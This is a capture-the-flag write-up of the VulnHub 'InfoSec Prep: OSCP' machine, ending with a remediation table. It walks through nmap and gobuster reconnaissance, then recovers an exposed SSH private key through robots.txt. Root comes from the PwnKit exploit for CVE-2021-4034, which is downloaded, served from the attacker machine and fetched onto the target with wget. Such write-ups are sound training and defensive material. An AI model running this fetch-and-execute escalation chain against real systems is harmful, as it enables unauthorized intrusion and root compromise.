# InfoSec Prep: OSCP — VulnHub Writeup

**Platform:** VulnHub | **Difficulty:** Easy | **Target IP:** 192.168.32.143 | **Attacker IP:** 192.168.32.128

## Machine info

![Machine info](images/01-machine-info.png)

## Summary

**InfoSec Prep: OSCP** is built around a private SSH key left exposed on the web server, disclosed through a file the site's own `robots.txt` tried to hide. That key granted an initial foothold, and an outdated Polkit `pkexec` binary vulnerable to CVE-2021-4034 (PwnKit) provided a direct, one-command escalation to root.

**Attack chain:** Nmap recon → `robots.txt` discloses hidden `secret.txt` → base64-encoded SSH private key recovered → SSH login as `oscp` → SUID enumeration → Polkit `pkexec` CVE-2021-4034 (PwnKit) → Root

## 1. Reconnaissance

![arp-scan](images/02-arp-scan.png)

![ping](images/03-ping.png)

```
nmap -p- -sS -sV -sC -vvv -oN scan.txt 192.168.32.143

PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.4.2
| http-robots.txt: 1 disallowed entry
|_/secret.txt
|_http-title: OSCP Voucher &#8211; Just another WordPress site
33060/tcp open  mysqlx  syn-ack ttl 64 MySQL X protocol listener
MAC Address: 00:0C:29:17:C1:E7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three services of interest: SSH, a WordPress site, and MySQL X protocol. The nmap `http-robots.txt` script already flagged a disallowed entry: `/secret.txt`.

## 2. Web Enumeration

The WordPress front page ("OSCP Voucher") describes a challenge: obtain the root flag from `/root/` to enter a giveaway.

![OSCP Voucher blog post](images/04-blog-post-hunt.png)

```
gobuster dir -u http://192.168.32.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt

index.php            (Status: 301) [Size: 0] [--> http://192.168.32.143/]
wp-content           (Status: 301) [Size: 321] [--> http://192.168.32.143/wp-content/]
wp-login.php         (Status: 200) [Size: 4829]
license.txt          (Status: 200) [Size: 19915]
wp-includes          (Status: 301) [Size: 322] [--> http://192.168.32.143/wp-includes/]
javascript           (Status: 301) [Size: 321] [--> http://192.168.32.143/javascript/]
robots.txt           (Status: 200) [Size: 36]
wp-trackback.php     (Status: 200) [Size: 135]
secret.txt           (Status: 200) [Size: 3502]
wp-admin             (Status: 301) [Size: 319] [--> http://192.168.32.143/wp-admin/]
xmlrpc.php           (Status: 405) [Size: 42]
```

`robots.txt` explicitly disallows `/secret.txt` — which of course makes it the first place to check:

![robots.txt](images/05-robots-txt.png)

`secret.txt` contains a large base64-encoded blob:

![secret.txt](images/06-secret-txt.png)

## 3. Foothold

Decoding the blob revealed an OpenSSH private key for the `oscp` user.

```
echo "<base64 blob>" | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
...
-----END OPENSSH PRIVATE KEY-----
```

```
chmod 600 id_rsa
```

![SSH login as oscp](images/07-ssh-login.png)

## 4. Privilege Escalation

Enumerated SUID binaries with `find / -perm -4000 2>/dev/null`, which listed `/usr/bin/pkexec` among the results. Its version was vulnerable to CVE-2021-4034 (PwnKit):

```
pkexec --version
pkexec version 0.105
```

Downloaded and compiled the PwnKit exploit on the attacker machine, served it, and pulled it onto the target:

```
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python -m http.server

wget http://192.168.32.128:8000/PwnKit
chmod +x PwnKit
```

Running the exploit dropped straight into a root shell:

![PwnKit → root](images/08-pwnkit-root.png)

![Root flag](images/09-root-flag.png)

**Flag:** `d73b04b0e696b0945283defa3eee4538`

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| Sensitive file (`secret.txt`) disclosed via `robots.txt`, containing a plaintext SSH private key | Never store private keys on a web server; `robots.txt` only signals crawlers, it does not restrict access — don't rely on it to hide sensitive files |
| Outdated Polkit (`pkexec` 0.105) vulnerable to CVE-2021-4034 (PwnKit) | Patch Polkit/`pkexec` to a version with the CVE-2021-4034 fix; remove the SUID bit from `pkexec` if not required |
